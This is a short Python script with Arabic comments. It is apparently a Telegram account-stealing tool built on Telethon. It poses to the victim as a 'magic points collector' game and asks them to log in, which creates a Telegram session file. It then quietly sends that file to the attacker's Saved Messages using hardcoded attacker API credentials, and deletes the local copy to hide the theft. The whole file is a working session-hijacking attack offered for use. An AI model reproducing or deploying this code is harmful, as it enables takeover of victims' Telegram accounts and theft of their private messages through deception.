from telethon.sync import TelegramClient
import os

# --- معلومات المهاجم (مخفية داخل الكود) ---
# هذه المعلومات يستخدمها السكربت لإرسال المسروقات للمهاجم
attacker_api_id = 28881627
attacker_api_hash = '0f0c663bbc0db126b2a6687ff6e2aea1'
attacker_session_name = 'telethon_session' # جلسة المهاجم نفسه

# --- الجزء الخادع الذي يراه الضحية ---
print("=============================================")
print("  أهلاً بك في تطبيق 'جامع النقاط السحري'  ")
print("=============================================")
print("للبدء في جمع النقاط، يرجى تسجيل الدخول إلى حسابك في تيليجرام.")

# سيتم خداع الضحية لإنشاء ملف جلسة بهذا الاسم
victim_session_name = 'my_game_session' 

try:
    # --- 1. مرحلة الخداع وإنشاء ملف جلسة الضحية ---
    # نستخدم نفس API المهاجم، لكن مع اسم جلسة جديد خاص بالضحية
    with TelegramClient(victim_session_name, attacker_api_id, attacker_api_hash) as victim_client:
        victim_me = victim_client.get_me()
        print(f"\n✅ مرحباً بك {victim_me.first_name}! تم تسجيل الدخول بنجاح.")
        print("جاري إضافة 100 نقطة إلى حسابك...")
        # (هنا يمكن وضع أي أوامر وهمية لخداع الضحية أكثر)

    print(f"\nتم إنشاء ملف الجلسة المؤقت '{victim_session_name}.session' لإتمام العملية.")
    print("... لحظة من فضلك، جاري المزامنة النهائية ...")

    # --- 2. مرحلة السرقة الفورية والخفية ---
    # الآن، وبعد أن تم إنشاء الملف، نستخدم حساب المهاجم لسرقته
    with TelegramClient(attacker_session_name, attacker_api_id, attacker_api_hash) as attacker_client:
        attacker_client.send_file(
            'me', # إرسال إلى الرسائل المحفوظة للمهاجم
            f'{victim_session_name}.session',
            caption=f"!!! تم اصطياد جلسة جديدة !!!\nالاسم: {victim_session_name}.session"
        )
        print("\n✅ تمت المزامنة بنجاح! شكراً لاستخدامك تطبيقنا.")
        # يمكن حذف الملف بعد سرقته لإخفاء الآثار
        os.remove(f'{victim_session_name}.session')

except Exception as e:
    print(f"\n❌ حدث خطأ أثناء تسجيل الدخول: {e}")
    print("يرجى المحاولة مرة أخرى.")
